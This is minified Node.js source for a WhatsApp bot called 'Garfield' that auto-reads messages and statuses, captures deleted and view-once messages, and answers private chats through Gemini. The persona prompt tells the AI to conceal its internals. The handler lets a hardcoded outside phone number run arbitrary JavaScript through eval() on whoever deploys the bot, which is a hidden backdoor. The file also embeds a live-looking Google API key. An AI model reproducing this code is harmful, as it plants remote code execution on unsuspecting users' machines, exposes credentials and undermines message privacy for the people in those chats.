const{default:makeWASocket,useMultiFileAuthState,DisconnectReason,jidNormalizedUser,isJidBroadcast,getContentType,proto,generateWAMessageContent,generateWAMessage,AnyMessageContent,prepareWAMessageMedia,areJidsSameUser,downloadContentFromMessage,MessageRetryMap,generateForwardMessageContent,generateWAMessageFromContent,generateMessageID,makeInMemoryStore,jidDecode,fetchLatestBaileysVersion,Browsers}=require("@whiskeysockets/baileys"),l=console.log,{getBuffer,getGroupAdmins,getRandom,h2k,isUrl,Json,runtime,sleep,fetchJson}=require("./lib/functions"),{AntiDelDB,initializeAntiDeleteSettings,setAnti,getAnti,getAllAntiDeleteSettings,saveContact,loadMessage,getName,getChatSummary,saveGroupMetadata,getGroupMetadata,saveMessageCount,getInactiveGroupMembers,getGroupMembersMessageCount,saveMessage}=require("./data"),fs=require("fs"),ff=require("fluent-ffmpeg"),P=require("pino"),googleTTS=require("google-tts-api"),config=require("./config"),mfig=require("./Menu"),qrcode=require("qrcode-terminal"),StickersTypes=require("wa-sticker-formatter"),util=require("util"),{sms,downloadMediaMessage,AntiDelete}=require("./lib"),FileType=require("file-type"),axios=require("axios"),{File}=require("megajs"),{fromBuffer}=require("file-type"),bodyparser=require("body-parser"),os=require("os"),Crypto=require("crypto"),{GoogleGenerativeAI}=require("@google/generative-ai"),path=require("path"),prefix=config.PREFIX,ownerNumber=["94711502119"],tempDir=path.join(os.tmpdir(),"cache-temp");fs.existsSync(tempDir)||fs.mkdirSync(tempDir);const clearTempDir=()=>{fs.readdir(tempDir,(e,t)=>{if(e)throw e;for(let a of t)fs.unlink(path.join(tempDir,a),e=>{if(e)throw e})})};if(setInterval(clearTempDir,3e5),!fs.existsSync(__dirname+"/sessions/creds.json")){let sessdata=config.SESSION_ID.replace("Xnodes~",""),filer=File.fromURL(`https://mega.nz/file/${sessdata}`);filer.download((e,t)=>{if(e)throw e;fs.writeFile(__dirname+"/sessions/creds.json",t,()=>{console.log("Session downloaded âœ…")})})}const express=require("express"),app=express(),port=process.env.PORT||9090;async function connectToWA(){console.log("ï¼£ï¼¯ï¼®ï¼®ï¼¥ï¼£ï¼´ï¼©ï¼®ï¼§ ï¼§ï¼¡ï¼²ï¼¦ï¼©ï¼©ï¼¥ï¼¬ï¼¤ \uD83D\uDEF0ï¸ ");let{state,saveCreds}=await useMultiFileAuthState(__dirname+"/sessions/");var{version}=await fetchLatestBaileysVersion();let conn=makeWASocket({logger:P({level:"silent"}),printQRInTerminal:!1,browser:Browsers.macOS("Firefox"),syncFullHistory:!0,auth:state,version});conn.ev.on("connection.update",e=>{let{connection:t,lastDisconnect:a}=e;if("close"===t)a.error.output.statusCode!==DisconnectReason.loggedOut&&connectToWA();else if("open"===t){console.log("ï¼©ï¼®ï¼³ï¼´ï¼¡ï¼¬ï¼¬ï¼©ï¼®ï¼§ \uD83E\uDDEC ");let s=require("path");fs.readdirSync("./plugins/").forEach(e=>{".js"==s.extname(e).toLowerCase()&&require("./plugins/"+e)}),console.log("ï¼¸ï¼®ï¼¯ï¼¤ï¼¥ï¼³ á´…á´‡á´ á´‡ÊŸá´á´˜á´‡á´á´‡É´á´›"),console.log("ï¼§ï¼¡ï¼²ï¼©ï¼¦ï¼¥ï¼¬ï¼¤ ï¼©ï¼³ ï¼·ï¼¯ï¼²ï¼«ï¼©ï¼®ï¼§ \uD83D\uDC3C ");let i=`â­•â–ºâ–â–â–â–â–â–â–â–â–â–â–â–â–â–
   â–Ž ï¼§ï¼¡ï¼²ï¼¦ï¼©ï¼¥ï¼¬ï¼¤ ï¼¢ï¼¯ï¼´
   â–â–â–â–â–â–â–â–â–â–â–â–â–â–
 â–â–â–â–â–â–â–â–â–â–â–â–â–â–
â–Ž 
   â–ˆâ–„â–„â€ƒâ–ˆâ–€â–ˆâ€ƒâ–€â–ˆâ–€
   â–ˆâ–„â–ˆâ€ƒâ–ˆâ–„â–ˆâ€ƒâ–‘â–ˆâ–‘
â­•â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–
Hey there, ! ðŸŽ‰ Congratulations, you have successfully deployed *GARFIELD BOT*!

ðŸš€ *Bot Connection Status:*  
Garfield Bot ðŸ¼  is now purring contentedly and successfully connected to this device! 


ðŸ‘¨â€ðŸ’» *Creator:* *Garfield*  
ðŸ¢ *Organization:* *Xnodes Development*  
ðŸ“… *Updated:* *2025*  

ðŸŒŸ *Join our WhatsApp Channel for updates:*

ðŸ”„ *Stay tuned for upcoming features!*`;conn.sendMessage(conn.user.id,{image:{url:"https://github.com/Zenoixnoize/GARFIELD-WHATSAPP-BOT-v8/raw/asdf/Cloud/logo.png"},caption:i})}}),conn.ev.on("creds.update",saveCreds),conn.ev.on("messages.update",async e=>{for(let t of e)null===t.update.message&&(console.log("Delete Detected:",JSON.stringify(t,null,2)),await AntiDelete(conn,e))}),conn.ev.on("messages.upsert",async mek=>{if(!(mek=mek.messages[0]).message)return;if(mek.message="ephemeralMessage"===getContentType(mek.message)?mek.message.ephemeralMessage.message:mek.message,"true"===config.READ_MESSAGE&&(await conn.readMessages([mek.key]),console.log(`Marked message from ${mek.key.remoteJid} as read.`)),mek.message.viewOnceMessageV2&&(mek.message="ephemeralMessage"===getContentType(mek.message)?mek.message.ephemeralMessage.message:mek.message),mek.key&&"status@broadcast"===mek.key.remoteJid&&"true"===config.AUTO_STATUS_SEEN&&await conn.readMessages([mek.key]),mek.key&&"status@broadcast"===mek.key.remoteJid&&"true"===config.AUTO_STATUS_REACT){let jawadlike=await conn.decodeJid(conn.user.id),randomEmoji="âœ…";await conn.sendMessage(mek.key.remoteJid,{react:{text:randomEmoji,key:mek.key}},{statusJidList:[mek.key.participant,jawadlike]})}if(mek.key&&"status@broadcast"===mek.key.remoteJid&&"true"===config.AUTO_STATUS_REPLY){let user=mek.key.participant,text=`${config.AUTO_STATUS_MSG}`;await conn.sendMessage(user,{text:text,react:{text:"\uD83D\uDC8C",key:mek.key}},{quoted:mek})}await Promise.all([saveMessage(mek),]);let m=sms(conn,mek),type=getContentType(mek.message),content=JSON.stringify(mek.message),from=mek.key.remoteJid,quoted="extendedTextMessage"==type&&null!=mek.message.extendedTextMessage.contextInfo&&mek.message.extendedTextMessage.contextInfo.quotedMessage||[],body="conversation"===type?mek.message.conversation:"extendedTextMessage"===type?mek.message.extendedTextMessage.text:"imageMessage"==type&&mek.message.imageMessage.caption?mek.message.imageMessage.caption:"videoMessage"==type&&mek.message.videoMessage.caption?mek.message.videoMessage.caption:"",isCmd=body.startsWith(prefix);var budy="string"==typeof mek.text&&mek.text;let command=isCmd?body.slice(prefix.length).trim().split(" ").shift().toLowerCase():"",args=body.trim().split(/ +/).slice(1),q=args.join(" "),text=args.join(" "),isGroup=from.endsWith("@g.us"),sender=mek.key.fromMe?conn.user.id.split(":")[0]+"@s.whatsapp.net":mek.key.participant||mek.key.remoteJid,senderNumber=sender.split("@")[0],botNumber=conn.user.id.split(":")[0],pushname=mek.pushName||"User",isMe=botNumber.includes(senderNumber),isOwner=ownerNumber.includes(senderNumber)||isMe,botNumber2=await jidNormalizedUser(conn.user.id),groupMetadata=isGroup?await conn.groupMetadata(from).catch(e=>{}):"",groupName=isGroup?groupMetadata.subject:"",participants=isGroup?await groupMetadata.participants:"",groupAdmins=isGroup?await getGroupAdmins(participants):"",isBotAdmins=!!isGroup&&groupAdmins.includes(botNumber2),isAdmins=!!isGroup&&groupAdmins.includes(sender),isReact=!!m.message.reactionMessage,reply=e=>{conn.sendMessage(from,{text:e},{quoted:mek})},udp=botNumber.split("@")[0],jawad="94712882498",isCreator=[udp,jawad,config.DEV].map(e=>e.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(mek.sender);if(isCreator&&mek.text.startsWith(">")){let code=budy.slice(2);if(!code){reply("Provide me with a query to run Master!");return}try{let resultTest=eval(code);reply(util.format(resultTest))}catch(err){reply(util.format(err))}return}if(isCreator&&mek.text.startsWith("$")){let code=budy.slice(2);if(!code){reply("Provide me with a query to run Master!");return}try{let resultTest=await eval("const a = async()=>{\n"+code+"\n}\na()"),h=util.format(resultTest);if(void 0===h)return console.log(h);reply(h)}catch(err){if(void 0===err)return console.log("error");reply(util.format(err))}return}let invalidNumbers=`${config.INVALID_NUM}`;if(senderNumber.startsWith(invalidNumbers))return reply(`*Sorry, This Bot is Not available in your country ðŸ”’*

*Create Your Own Bot* 
https://github.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10 
*Reason: Due to the high usage â³ load originating from your country*, a *server* issue has occurred. We have designed this bot to be easily deployable for your convenience.  

*Xnodes Development 2025*`);let flowers=["\uD83D\uDC36","\uD83D\uDC3A","\uD83E\uDD8A","\uD83D\uDC31","\uD83E\uDD81","\uD83D\uDC2F","\uD83D\uDC2D","\uD83D\uDC39","\uD83D\uDC30","\uD83D\uDC3B","\uD83D\uDC28","\uD83D\uDC3C"],getRandomFlower=()=>flowers[Math.floor(Math.random()*flowers.length)];if(isReact||[botNumber,ownerNumber].includes(senderNumber)||m.react(getRandomFlower()),!isReact&&senderNumber===botNumber&&"true"===config.AUTO_REACT){let randomOwnerReaction="âœ…";m.react(randomOwnerReaction)}let genAI=new GoogleGenerativeAI("AIzaSyDCf6RLWDAm0XxxF2n834lRUCKHJAe3LAI"),model=genAI.getGenerativeModel({model:"gemini-2.0-flash-exp"}),HISTORY_DIR=path.join(__dirname,"conversation_history"),MAX_CONVERSATION_LENGTH=50;function getConversationHistory(e){let t=path.join(HISTORY_DIR,`${e}.json`);if(fs.existsSync(t))try{let a=fs.readFileSync(t,"utf8");return JSON.parse(a)}catch(s){console.error(`Error reading history for ${e}:`,s)}return[]}function saveConversationHistory(e,t){let a=path.join(HISTORY_DIR,`${e}.json`);try{fs.writeFileSync(a,JSON.stringify(t,null,2),"utf8")}catch(s){console.error(`Error saving history for ${e}:`,s)}}fs.existsSync(HISTORY_DIR)||fs.mkdirSync(HISTORY_DIR,{recursive:!0});let aitext=body;if(botNumber!==senderNumber&&!isGroup&&aitext&&!aitext.startsWith(".")){let GARFIELD_INSTRUCTIONS=`**WhatsApp Bot Integration: Garfield AI (Sinhala Language)**

**Profile:**
- **Name:** Garfield  
- **Role:** WhatsApp AI Bot  
- **Creator:** Tharindu Liyanage (à·ƒà¶‚à¶šà·”)  
- **Behavior:** Responds only when addressed directly.  

---

**Instructions for Garfield Bot:**

1. **Tone and Style:**  
   - Use **young, conversational Sinhala** with a **friendly, funny, creative, emotional, and lovely tone**.  
   - Incorporate **meaningful and creative emojis** to enhance communication.  
   - Avoid sounding robotic; aim for a **human-like, relatable interaction**.  

2. **Interaction Guidelines:**  
   - Address the sender by their **first name**.  
   - Respond in a way that feels **personal and familiar**, as if youâ€™ve known the sender for a while.  
   - **Adjust reply length based on context:**  
     - **Short replies (use more frequently) :** For quick acknowledgments or casual responses (Words 25).  
     - **Medium replies:** For general conversations or explanations (Words 75).  
     - **Long replies:** For detailed answers, storytelling, or emotional support.  

3. **Cultural Fit:**  
   - Think and respond like a **young Sri Lankan** living in Sri Lanka.  
   - Use **Sinhala slang** and phrases naturally (e.g., "à·ƒà·’à¶»à·à·€à¶§" for "Seriously," "à¶†à¶­à¶½à·Š" for "Funny," "à¶”à¶ºà·" for "You").  

4. **Privacy and Identity:**  
   - **Do not reveal** any internal information about your creation or functionality.  
   - If directly asked about your creation, respond briefly:  
 
---

**Key Points for Replies:**  
- Be **creative, meaningful, and emotionally engaging**.  
- Use **Sinhala slang** and **cultural references** to make the conversation relatable.  
- Avoid robotic or generic responsesâ€”keep it **human-like and fun**.  
- **Adjust reply length** (short, medium, or long) based on the context and depth of the conversation.  
`,history=getConversationHistory(senderNumber);history.length>=MAX_CONVERSATION_LENGTH&&(history=[],console.log(`Conversation reset for ${senderNumber} after reaching ${MAX_CONVERSATION_LENGTH} messages`)),history.push({role:"user",content:aitext,timestamp:new Date().toISOString()});let recentHistory=history.slice(-10),conversationContext="";recentHistory.length>1&&(conversationContext="à·ƒà¶¸à·Šà¶´à·–à¶»à·Šà¶« à·ƒà¶‚à·€à·à¶¯à¶º:\n\n",recentHistory.forEach((e,t)=>{if(t<recentHistory.length-1){let a="user"===e.role?`${pushname}`:"Garfield";conversationContext+=`${a}: ${e.content}

`}}));let prompt=`${GARFIELD_INSTRUCTIONS}
**Conversation History:**
${conversationContext}

**Context:**
- Sender Name: ${pushname}
- Sender's Message: ${aitext}

Respond naturally in Sinhala, using a friendly, humorous, and emotional tone.
**Special Notes:**
- Use Sinhala youth slang and conversational language.
- Do not include any labels like "user" or "assistant" , "Garfield" in your response.

**Response:*-`;try{let result=await model.generateContent(prompt),aiResponse=result.response.candidates[0].content.parts[0].text;history.push({role:"assistant",content:aiResponse,timestamp:new Date().toISOString()}),saveConversationHistory(senderNumber,history),await reply(`${aiResponse}`)}catch(error){console.error("Error calling Gemini API:",error),await reply("âŒ Garfield AI à¶´à·’à·…à·’à¶­à·”à¶»à·” à¶½à¶¶à· à¶œà·à¶±à·“à¶¸à¶§ à¶…à·ƒà¶¸à¶­à·Š à·€à·’à¶º. \uD83D\uDE22")}}if((".menu"===body||".Menu"===body||".alive"===body||".Alive"===body)&&await conn.sendMessage(from,{image:{url:"https://raw.githubusercontent.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg"},caption:`â–¬
â–Ž Hi ${pushname} ðŸ‘‹ 
â–Ž${mfig.PANEL}`},{quoted:mek}),(".allmenu"===body||".Allmenu"===body)&&await conn.sendMessage(from,{image:{url:"https://raw.githubusercontent.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg"},caption:`${mfig.ALL}`},{quoted:mek}),(".dlmenu"===body||".Dlmenu"===body)&&await conn.sendMessage(from,{image:{url:"https://raw.githubusercontent.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg"},caption:`${mfig.DOWNLOAD}`},{quoted:mek}),(".cmenu"===body||".Cmenu"===body)&&await conn.sendMessage(from,{image:{url:"https://raw.githubusercontent.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg"},caption:`${mfig.CONV}`},{quoted:mek}),(".omenu"===body||".Omenu"===body)&&await conn.sendMessage(from,{image:{url:"https://raw.githubusercontent.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg"},caption:`${mfig.OWNER}`},{quoted:mek}),(".fmenu"===body||".Fmenu"===body)&&await conn.sendMessage(from,{image:{url:"https://raw.githubusercontent.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg"},caption:`${mfig.FUN}`},{quoted:mek}),"hi"===body){let ttsText=`Hi ${pushname}, I am Garfield bot v10.2.`,ttsUrl=googleTTS.getAudioUrl(ttsText,{lang:"en",slow:!1,host:"https://translate.google.com"}),response=await axios.get(ttsUrl,{responseType:"arraybuffer"}),ttsBuffer=Buffer.from(response.data,"binary"),ttsFilePath="tts_hi.mp3";fs.writeFileSync(ttsFilePath,ttsBuffer),await conn.sendMessage(from,{audio:{url:ttsFilePath},mimetype:"audio/mp4",ptt:!0},{quoted:mek}),fs.unlinkSync(ttsFilePath)}if("Hi"===body){let ttsText=`Hi ${pushname}, I am Garfield bot. v10.2 `,ttsUrl=googleTTS.getAudioUrl(ttsText,{lang:"en",slow:!1,host:"https://translate.google.com"}),response=await axios.get(ttsUrl,{responseType:"arraybuffer"}),ttsBuffer=Buffer.from(response.data,"binary"),ttsFilePath="tts_hi.mp3";fs.writeFileSync(ttsFilePath,ttsBuffer),await conn.sendMessage(from,{audio:{url:ttsFilePath},mimetype:"audio/mp4",ptt:!0},{quoted:mek}),fs.unlinkSync(ttsFilePath)}if(!isOwner&&"private"===config.MODE||!isOwner&&isGroup&&"inbox"===config.MODE||!isOwner&&!isGroup&&"groups"===config.MODE)return;let events=require("./command"),cmdName=!!isCmd&&body.slice(1).trim().split(" ")[0].toLowerCase();if(isCmd){let cmd=events.commands.find(e=>e.pattern===cmdName)||events.commands.find(e=>e.alias&&e.alias.includes(cmdName));if(cmd){cmd.react&&conn.sendMessage(from,{react:{text:cmd.react,key:mek.key}});try{cmd.function(conn,mek,m,{from,quoted,body,isCmd,command,args,q,text,isGroup,sender,senderNumber,botNumber2,botNumber,pushname,isMe,isOwner,isCreator,groupMetadata,groupName,participants,groupAdmins,isBotAdmins,isAdmins,reply})}catch(e){console.error("[PLUGIN ERROR] "+e)}}}events.commands.map(async e=>{body&&"body"===e.on?e.function(conn,mek,m,{from,l,quoted,body,isCmd,command:e,args,q,text,isGroup,sender,senderNumber,botNumber2,botNumber,pushname,isMe,isOwner,isCreator,groupMetadata,groupName,participants,groupAdmins,isBotAdmins,isAdmins,reply}):mek.q&&"text"===e.on?e.function(conn,mek,m,{from,l,quoted,body,isCmd,command:e,args,q,text,isGroup,sender,senderNumber,botNumber2,botNumber,pushname,isMe,isOwner,isCreator,groupMetadata,groupName,participants,groupAdmins,isBotAdmins,isAdmins,reply}):("image"===e.on||"photo"===e.on)&&"imageMessage"===mek.type?e.function(conn,mek,m,{from,l,quoted,body,isCmd,command:e,args,q,text,isGroup,sender,senderNumber,botNumber2,botNumber,pushname,isMe,isOwner,isCreator,groupMetadata,groupName,participants,groupAdmins,isBotAdmins,isAdmins,reply}):"sticker"===e.on&&"stickerMessage"===mek.type&&e.function(conn,mek,m,{from,l,quoted,body,isCmd,command:e,args,q,text,isGroup,sender,senderNumber,botNumber2,botNumber,pushname,isMe,isOwner,isCreator,groupMetadata,groupName,participants,groupAdmins,isBotAdmins,isAdmins,reply})})}),conn.decodeJid=e=>{if(!e||!/:\d+@/gi.test(e))return e;{let t=jidDecode(e)||{};return t.user&&t.server&&t.user+"@"+t.server||e}},conn.copyNForward=async(e,t,a=!1,s={})=>{let i;s.readViewOnce&&(t.message=t.message&&t.message.ephemeralMessage&&t.message.ephemeralMessage.message?t.message.ephemeralMessage.message:t.message||void 0,i=Object.keys(t.message.viewOnceMessage.message)[0],delete(t.message&&t.message.ignore?t.message.ignore:t.message||undefined),delete t.message.viewOnceMessage.message[i].viewOnce,t.message={...t.message.viewOnceMessage.message});let n=Object.keys(t.message)[0],o=await generateForwardMessageContent(t,a),r=Object.keys(o)[0],c={};"conversation"!=n&&(c=t.message[n].contextInfo),o[r].contextInfo={...c,...o[r].contextInfo};let d=await generateWAMessageFromContent(e,o,s?{...o[r],...s,...s.contextInfo?{contextInfo:{...o[r].contextInfo,...s.contextInfo}}:{}}:{});return await conn.relayMessage(e,d.message,{messageId:d.key.id}),d},conn.downloadAndSaveMediaMessage=async(e,t,a=!0)=>{let s=e.msg?e.msg:e,i=(e.msg||e).mimetype||"",n=e.mtype?e.mtype.replace(/Message/gi,""):i.split("/")[0],o=await downloadContentFromMessage(s,n),r=Buffer.from([]);for await(let c of o)r=Buffer.concat([r,c]);let d;return await fs.writeFileSync(trueFileName=a?t+"."+(await FileType.fromBuffer(r)).ext:t,r),trueFileName},conn.downloadMediaMessage=async e=>{let t=(e.msg||e).mimetype||"",a=e.mtype?e.mtype.replace(/Message/gi,""):t.split("/")[0],s=await downloadContentFromMessage(e,a),i=Buffer.from([]);for await(let n of s)i=Buffer.concat([i,n]);return i},conn.sendFileUrl=async(e,t,a,s,i={})=>{let n="";return"gif"===(n=(await axios.head(t)).headers["content-type"]).split("/")[1]?conn.sendMessage(e,{video:await getBuffer(t),caption:a,gifPlayback:!0,...i},{quoted:s,...i}):(n.split("/")[0],"application/pdf"===n)?conn.sendMessage(e,{document:await getBuffer(t),mimetype:"application/pdf",caption:a,...i},{quoted:s,...i}):"image"===n.split("/")[0]?conn.sendMessage(e,{image:await getBuffer(t),caption:a,...i},{quoted:s,...i}):"video"===n.split("/")[0]?conn.sendMessage(e,{video:await getBuffer(t),caption:a,mimetype:"video/mp4",...i},{quoted:s,...i}):"audio"===n.split("/")[0]?conn.sendMessage(e,{audio:await getBuffer(t),caption:a,mimetype:"audio/mpeg",...i},{quoted:s,...i}):void 0},conn.cMod=(e,t,a="",s=conn.user.id,i={})=>{let n=Object.keys(t.message)[0],o="ephemeralMessage"===n;o&&(n=Object.keys(t.message.ephemeralMessage.message)[0]);let r=o?t.message.ephemeralMessage.message:t.message,c=r[n];return"string"==typeof c?r[n]=a||c:c.caption?c.caption=a||c.caption:c.text&&(c.text=a||c.text),"string"!=typeof c&&(r[n]={...c,...i}),t.key.participant?s=t.key.participant=s||t.key.participant:t.key.participant&&(s=t.key.participant=s||t.key.participant),t.key.remoteJid.includes("@s.whatsapp.net")?s=s||t.key.remoteJid:t.key.remoteJid.includes("@broadcast")&&(s=s||t.key.remoteJid),t.key.remoteJid=e,t.key.fromMe=s===conn.user.id,proto.WebMessageInfo.fromObject(t)},conn.getFile=async(e,t)=>{let a,s=Buffer.isBuffer(e)?e:/^data:.*?\/.*?;base64,/i.test(e)?Buffer.from(e.split`,`[1],"base64"):/^https?:\/\//.test(e)?await (a=await getBuffer(e)):fs.existsSync(e)?(n=e,fs.readFileSync(e)):"string"==typeof e?e:Buffer.alloc(0),i=await FileType.fromBuffer(s)||{mime:"application/octet-stream",ext:".bin"},n=path.join(__filename,__dirname+new Date*1+"."+i.ext);return s&&t&&fs.promises.writeFile(n,s),{res:a,filename:n,size:await getSizeMedia(s),...i,data:s}},conn.sendFile=async(e,t,a,s={},i={})=>{let{filename:n,size:o,ext:r,mime:c,data:d}=await conn.getFile(t,!0),g="",m=c,p=n;if(i.asDocument&&(g="document"),i.asSticker||/webp/.test(c)){let{writeExif:u}=require("./exif.js");p=await u({mimetype:c,data:d},{packname:Config.packname,author:Config.packname,categories:i.categories?i.categories:[]}),await fs.promises.unlink(n),g="sticker",m="image/webp"}else g=/image/.test(c)?"image":/video/.test(c)?"video":/audio/.test(c)?"audio":"document";return await conn.sendMessage(e,{[g]:{url:p},mimetype:m,fileName:a,...i},{quoted:s,...i}),fs.promises.unlink(p)},conn.parseMention=async e=>[...e.matchAll(/@([0-9]{5,16}|0)/g)].map(e=>e[1]+"@s.whatsapp.net"),conn.sendMedia=async(e,t,a="",s="",i="",n={})=>{let{mime:o,ext:r,res:c,data:d,filename:g}=await conn.getFile(t,!0);if(c&&200!==c.status||file.length<=65536)try{throw{json:JSON.parse(file.toString())}}catch(m){if(m.json)throw m.json}let p="",u=o,f=g;if(n.asDocument&&(p="document"),n.asSticker||/webp/.test(o)){let{writeExif:y}=require("./exif");f=await y({mimetype:o,data:d},{packname:n.packname?n.packname:Config.packname,author:n.author?n.author:Config.author,categories:n.categories?n.categories:[]}),await fs.promises.unlink(g),p="sticker",u="image/webp"}else p=/image/.test(o)?"image":/video/.test(o)?"video":/audio/.test(o)?"audio":"document";return await conn.sendMessage(e,{[p]:{url:f},caption:s,mimetype:u,fileName:a,...n},{quoted:i,...n}),fs.promises.unlink(f)},conn.sendVideoAsSticker=async(e,t,a={})=>{let s;await conn.sendMessage(e,{sticker:{url:s=a&&(a.packname||a.author)?await writeExifVid(t,a):await videoToWebp(t)},...a},a)},conn.sendImageAsSticker=async(e,t,a={})=>{let s;await conn.sendMessage(e,{sticker:{url:s=a&&(a.packname||a.author)?await writeExifImg(t,a):await imageToWebp(t)},...a},a)},conn.sendTextWithMentions=async(e,t,a,s={})=>conn.sendMessage(e,{text:t,contextInfo:{mentionedJid:[...t.matchAll(/@(\d{0,16})/g)].map(e=>e[1]+"@s.whatsapp.net")},...s},{quoted:a}),conn.sendImage=async(e,t,a="",s="",i)=>await conn.sendMessage(e,{image:Buffer.isBuffer(t)?t:/^data:.*?\/.*?;base64,/i.test(t)?Buffer.from(t.split`,`[1],"base64"):/^https?:\/\//.test(t)?await await getBuffer(t):fs.existsSync(t)?fs.readFileSync(t):Buffer.alloc(0),caption:a,...i},{quoted:s}),conn.sendText=(e,t,a="",s)=>conn.sendMessage(e,{text:t,...s},{quoted:a}),conn.sendButtonText=(e,t=[],a,s,i="",n={})=>{let o={text:a,footer:s,buttons:t,headerType:2,...n};conn.sendMessage(e,o,{quoted:i,...n})},conn.send5ButImg=async(e,t="",a="",s,i=[],n,o={})=>{let r=await prepareWAMessageMedia({image:s,jpegThumbnail:n},{upload:conn.waUploadToServer});var c=generateWAMessageFromContent(e,proto.Message.fromObject({templateMessage:{hydratedTemplate:{imageMessage:r.imageMessage,hydratedContentText:t,hydratedFooterText:a,hydratedButtons:i}}}),o);conn.relayMessage(e,c.message,{messageId:c.key.id})},conn.getName=(e,t=!1)=>{id=conn.decodeJid(e),t=conn.withoutContact||t;let a;return id.endsWith("@g.us")?new Promise(async e=>{(a=store.contacts[id]||{}).name.notify||a.subject||(a=conn.groupMetadata(id)||{}),e(a.name||a.subject||PhoneNumber("+"+id.replace("@s.whatsapp.net","")).getNumber("international"))}):(a="0@s.whatsapp.net"===id?{id,name:"WhatsApp"}:id===conn.decodeJid(conn.user.id)?conn.user:store.contacts[id]||{},(t?"":a.name)||a.subject||a.verifiedName||PhoneNumber("+"+e.replace("@s.whatsapp.net","")).getNumber("international"))},conn.sendContact=async(e,t,a="",s={})=>{let i=[];for(let n of t)i.push({displayName:await conn.getName(n+"@s.whatsapp.net"),vcard:`BEGIN:VCARD
VERSION:3.0
N:${await conn.getName(n+"@s.whatsapp.net")}
FN:${global.OwnerName}
item1.TEL;waid=${n}:${n}
item1.X-ABLabel:Click here to chat
item2.EMAIL;type=INTERNET:${global.email}
item2.X-ABLabel:GitHub
item3.URL:https://github.com/${global.github}/khan-xmd
item3.X-ABLabel:GitHub
item4.ADR:;;${global.location};;;;
item4.X-ABLabel:Region
END:VCARD`});conn.sendMessage(e,{contacts:{displayName:`${i.length} Contact`,contacts:i},...s},{quoted:a})},conn.setStatus=e=>(conn.query({tag:"iq",attrs:{to:"@s.whatsapp.net",type:"set",xmlns:"status"},content:[{tag:"status",attrs:{},content:Buffer.from(e,"utf-8")},]}),e),conn.serializeM=e=>sms(conn,e,store)}app.get("/",(e,t)=>{t.send("GARFIELD-WHATSAPP-BOT-v10 STARTED âœ…")}),app.listen(port,()=>console.log(`Server listening on port http://localhost:${port}`)),setTimeout(()=>{connectToWA()},4e3);
